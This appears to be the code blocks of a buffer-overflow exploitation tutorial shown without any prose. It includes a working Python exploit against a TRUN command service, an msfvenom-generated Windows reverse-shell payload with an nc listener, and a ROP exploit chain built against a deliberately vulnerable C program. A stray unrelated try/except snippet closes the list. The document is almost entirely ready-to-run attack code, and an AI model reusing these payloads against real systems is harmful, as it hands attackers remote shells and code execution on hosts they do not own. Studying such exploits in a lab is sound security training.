["```\n#!/usr/bin/python\nimport socket\n\nserver = '172.16.89.131'\nsport = 9999\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nconnect = s.connect((server, sport))\nprint s.recv(1024)\nbuffer =''\nbuffer+= 'A'*2006\nbuffer += '\\x32\\x31\\xd9\\x7d'\nbuffer+= 'C'*(5000-2006-4)\ns.send(('TRUN .' + buffer + '\\r\\n'))\nprint s.recv(1024)\ns.send('EXIT\\r\\n') \nprint s.recv(1024)\ns.close()\n```", "```\n$ msfvenom -a x86 -platform Windows -p windows/shell_reverse_tcp LHOST=172.16.89.1 LPORT=4321 -b '\\x00' -f python\n```", "```\n#!/usr/bin/python\nimport socket\nserver = '172.16.89.131'\nsport = 9999\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nconnect = s.connect((server, sport))\nprint s.recv(1024)\n\njunk = 'A'*2006             \\\\ Junk value to overflow the stack\n\neip = '\\x32\\x31\\xd9\\x7d'    \\\\ jmp esp\n\nnops = '\\x90'*64    \\\\ To make sure that jump will be inside our shellcode\n\nshellcode = \"\"\nshellcode += \"\\xbb\\x6e\\x66\\xf1\\x4c\\xd9\\xe9\\xd9\\x74\\x24\\xf4\\x5a\\x2b\"\nshellcode += \"\\xc9\\xb1\\x52\\x31\\x5a\\x12\\x83\\xea\\xfc\\x03\\x34\\x68\\x13\"\nshellcode += \"\\xb9\\x34\\x9c\\x51\\x42\\xc4\\x5d\\x36\\xca\\x21\\x6c\\x76\\xa8\"\nshellcode += \"\\x22\\xdf\\x46\\xba\\x66\\xec\\x2d\\xee\\x92\\x67\\x43\\x27\\x95\"\nshellcode += \"\\xc0\\xee\\x11\\x98\\xd1\\x43\\x61\\xbb\\x51\\x9e\\xb6\\x1b\\x6b\"\nshellcode += \"\\x51\\xcb\\x5a\\xac\\x8c\\x26\\x0e\\x65\\xda\\x95\\xbe\\x02\\x96\"\nshellcode += \"\\x25\\x35\\x58\\x36\\x2e\\xaa\\x29\\x39\\x1f\\x7d\\x21\\x60\\xbf\"\nshellcode += \"\\x7c\\xe6\\x18\\xf6\\x66\\xeb\\x25\\x40\\x1d\\xdf\\xd2\\x53\\xf7\"\nshellcode += \"\\x11\\x1a\\xff\\x36\\x9e\\xe9\\x01\\x7f\\x19\\x12\\x74\\x89\\x59\"\nshellcode += \"\\xaf\\x8f\\x4e\\x23\\x6b\\x05\\x54\\x83\\xf8\\xbd\\xb0\\x35\\x2c\"\nshellcode += \"\\x5b\\x33\\x39\\x99\\x2f\\x1b\\x5e\\x1c\\xe3\\x10\\x5a\\x95\\x02\"\nshellcode += \"\\xf6\\xea\\xed\\x20\\xd2\\xb7\\xb6\\x49\\x43\\x12\\x18\\x75\\x93\"\nshellcode += \"\\xfd\\xc5\\xd3\\xd8\\x10\\x11\\x6e\\x83\\x7c\\xd6\\x43\\x3b\\x7d\"\nshellcode += \"\\x70\\xd3\\x48\\x4f\\xdf\\x4f\\xc6\\xe3\\xa8\\x49\\x11\\x03\\x83\"\nshellcode += \"\\x2e\\x8d\\xfa\\x2c\\x4f\\x84\\x38\\x78\\x1f\\xbe\\xe9\\x01\\xf4\"\nshellcode += \"\\x3e\\x15\\xd4\\x5b\\x6e\\xb9\\x87\\x1b\\xde\\x79\\x78\\xf4\\x34\"\nshellcode += \"\\x76\\xa7\\xe4\\x37\\x5c\\xc0\\x8f\\xc2\\x37\\x43\\x5f\\x95\\xc6\"\nshellcode += \"\\xf3\\x62\\x25\\xd9\\xe2\\xea\\xc3\\xb3\\xf4\\xba\\x5c\\x2c\\x6c\"\nshellcode += \"\\xe7\\x16\\xcd\\x71\\x3d\\x53\\xcd\\xfa\\xb2\\xa4\\x80\\x0a\\xbe\"\nshellcode += \"\\xb6\\x75\\xfb\\xf5\\xe4\\xd0\\x04\\x20\\x80\\xbf\\x97\\xaf\\x50\"\nshellcode += \"\\xc9\\x8b\\x67\\x07\\x9e\\x7a\\x7e\\xcd\\x32\\x24\\x28\\xf3\\xce\"\nshellcode += \"\\xb0\\x13\\xb7\\x14\\x01\\x9d\\x36\\xd8\\x3d\\xb9\\x28\\x24\\xbd\"\nshellcode += \"\\x85\\x1c\\xf8\\xe8\\x53\\xca\\xbe\\x42\\x12\\xa4\\x68\\x38\\xfc\"\nshellcode += \"\\x20\\xec\\x72\\x3f\\x36\\xf1\\x5e\\xc9\\xd6\\x40\\x37\\x8c\\xe9\"\nshellcode += \"\\x6d\\xdf\\x18\\x92\\x93\\x7f\\xe6\\x49\\x10\\x8f\\xad\\xd3\\x31\"\nshellcode += \"\\x18\\x68\\x86\\x03\\x45\\x8b\\x7d\\x47\\x70\\x08\\x77\\x38\\x87\"\nshellcode += \"\\x10\\xf2\\x3d\\xc3\\x96\\xef\\x4f\\x5c\\x73\\x0f\\xe3\\x5d\\x56\"\n\ninjection = junk + eip + nops + shellcode\ns.send(('TRUN .' + injection + '\\r\\n'))\nprint s.recv(1024)\ns.send('EXIT\\r\\n') \nprint s.recv(1024)\ns.close()\n```", "```\n$ nc -lp 4321\n```", "```\n./exploit.py\n```", "```\n $ sudo apt-get install python-pip\n $ sudo pip install capstone\n $ git clone https://github.com/sashs/ropper.git\n $ cd ropper\n $ git submodule init\n $ git submodule update\n```", "```\n#include <stdio.h>\n#include <unistd.h>\n\nint overflow() \n{\n    char buf[80];\n    int r;\n    read(0, buf, 500);\n    printf(\"The buffer content %d, %s\", r, buf);\n    return 0;\n}\n\nint main(int argc, char *argv[]) \n{\n    printf(\"Starting /bin/ls\");\n    overflow();\n    return 0;\n}\n```", "```\n$ gcc -fno-stack-protector rop.c -o rop\n```", "```\n$ gdb ./rop\n```", "```\n$ peda checksec\n```", "```\n$ peda pattern_create 500 pattern\n```", "```\n$ run < pattern\n```", "```\n$ x/wx $rsp\n```", "```\n$ peda pattern_offset 0x41413741\n```", "```\n#!/usr/bin/env python\nfrom struct import *\n\nbuffer = \"\"\nbuffer += \"A\"*104 # junk\nbuffer += \"B\"*6\nf = open(\"input.txt\", \"w\")\nf.write(buffer)\n```", "```\n$ chmod +x exploit.py\n$ ./exploit.py\n```", "```\n$ run < input.txt\n```", "```\n$ man 3 system\n```", "```\n$ ./Ropper.py --file /home/stack/buffer-overflow/rop/rop --search \"%rdi\"\n```", "```\n$ p system\n```", "```\n$ find \"/bin/ls\"\n```", "```\n#!/usr/bin/env python\nfrom struct import *\n\nbuffer = \"\"\nbuffer += \"A\"*104 # junk\nbuffer += pack(\"<Q\", 0x0000000000400653) # <-- ROP gadget\nbuffer += pack(\"<Q\", 0x400697) #  <-- pointer to \"/bin/ls\"\nbuffer += pack(\"<Q\", 0x7ffff7a57590) # < -- address of system function\n\nf = open(\"input.txt\", \"w\")\nf.write(buffer)\n```", "```\n$ ./exploit.py\n```", "```\n$ run < input.txt\n```", "```\ntry:\n    divide(6,0)\nexcept ValueError:\n    print \"That value was invalid.\"\n```"]